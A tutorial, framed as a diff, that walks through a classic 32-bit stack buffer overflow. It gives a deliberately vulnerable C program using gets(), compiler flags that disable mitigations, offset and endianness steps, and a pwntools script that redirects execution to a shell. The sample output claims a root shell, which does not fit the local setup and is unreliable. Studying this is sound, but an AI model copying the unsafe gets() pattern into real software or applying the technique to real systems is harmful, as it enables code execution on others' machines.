@@ -1,1 +1,126 @@
+A basic stack-based buffer overflow happens when a program writes more data to a buffer on the stack than it can hold, causing excess data to spill over and overwrite critical control structures like the Saved Base Pointer (EBP/RBP) and the Return Address (EIP/RIP).
+By overwriting the return address, an attacker can hijack the program's execution flow and redirect it to a target function (like a hidden win() function or shellcode).
+Here is a step-by-step example using a vulnerable C program and a modern Python 3 exploit script using pwntools.
 
+1. The Vulnerable C Program (vuln.c)
+
+In this classic scenario, the program allocates 64 bytes for a buffer but uses an unsafe function (gets or read) that does not check bounds, allowing us to input up to 256 bytes. Our goal is to divert execution to the win() function.
+c
+#include <stdio.h>
+#include <stdlib.h>
+
+void win() {
+    printf("[+] Success! Execution hijacked.\n");
+    // In a real CTF challenge, this would open a shell or read a flag file
+    system("/bin/sh"); 
+}
+
+void vulnerable_function() {
+    char buffer[64];
+    printf("Enter some text: ");
+    // VULNERABILITY: gets() does not check the size of the input
+    gets(buffer); 
+}
+
+int main() {
+    vulnerable_function();
+    return 0;
+}
+Use code with caution.
+
+Compilation (Turning off protections)
+
+Modern systems implement security mitigations (like Stack Canaries, ASLR, and NX bits). To learn the absolute basics, we compile this on a 32-bit Linux system with these mitigations disabled:
+bash
+gcc -m32 -fno-stack-protector -z execstack -no-pie vuln.c -o vuln
+Use code with caution.
+• -m32: Compiles as a 32-bit binary (simplifies memory architecture for beginners).
+• -fno-stack-protector: Disables the stack canary.
+• -no-pie: Disables Position Independent Executable (keeps code addresses static).
+
+2. Understanding the Stack Layout
+
+When vulnerable_function() is running, the memory stack looks like this:
+text
+       Top of Stack (Lower Memory Address)
+       +----------------------------------+
+
+       |       buffer (64 bytes)          |  <-- Where our input starts writing
+       +----------------------------------+
+
+       |   Compiler Padding / Alignment   |  <-- Extra space added by gcc
+       +----------------------------------+
+
+       |       Saved EBP (4 bytes)        |  <-- Overwriting this crashes registers
+       +----------------------------------+
+
+       |     Return Address (4 bytes)     |  <-- TARGET: Points to next instruction
+       +----------------------------------+
+       Bottom of Stack (Higher Memory Address)
+Use code with caution.
+
+3. Step-by-Step Exploitation Plan
+
+
+Step 1: Find the Offset
+
+Though the buffer size is 64 bytes, compilers often pad memory. We need to know the exact number of bytes required to reach and completely fill up to the Return Address.
+• We can use a debugger like gdb with a unique pattern to find the exact offset.
+• Let's assume through debugging we find the exact distance from the start of buffer to the Return Address is 76 bytes (64 bytes buffer + 8 bytes padding + 4 bytes saved EBP).
+
+Step 2: Get the Target Address
+
+We need the exact memory address of the win() function. In GDB, running x win or print win will reveal its static memory location:
+• Let's assume the address of win is 0x080491b6.
+
+Step 3: Account for Endianness
+
+Intel/AMD x86 processors use Little-Endian byte ordering. Memory addresses must be sent in reverse order.
+• 0x080491b6 must be transmitted as \xb6\x91\x04\x08.
+
+Step 4: Construct the Payload
+
+Our total payload will be:
+[76 bytes of garbage padding (A)] + [4 bytes of the target win() address]
+
+4. The Python Exploit Script (exploit.py)
+
+We use Python 3 with the pwntools library (the industry standard for binary exploitation) to automate the payload creation and interaction.
+python
+#!/usr/bin/env python3
+from pwn import *
+
+# 1. Start the vulnerable binary process
+io = process('./vuln')
+
+# 2. Define the exact offset to the return address
+# 64 (buffer) + 8 (compiler padding) + 4 (Saved EBP) = 76 bytes
+offset = 76
+
+# 3. Target function address (found via GDB)
+# p32() automatically converts the address to 32-bit little-endian format
+win_address = p32(0x080491b6)
+
+# 4. Construct the payload
+# Cyclic padding or simple 'A's fill up everything to the return address
+payload = b"A" * offset + win_address
+
+# 5. Send the payload when the program prompts us
+io.recvuntil(b"Enter some text: ")
+log.info(f"Sending malicious payload: {payload}")
+io.sendline(payload)
+
+# 6. Keep the shell interactive so we can execute commands in the spawned shell
+io.interactive()
+Use code with caution.
+
+Execution Output
+
+When you run the Python script, it pipes the payload into the binary, triggers the overflow, forces the program to return straight to the win() function, and drops you into a shell:
+bash
+$ python3 exploit.py
+[+] Starting local process './vuln': pid 12345
+[*] Sending malicious payload: b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb6\x91\x04\x08'
+[+] Success! Execution hijacked.
+$ whoami
+root
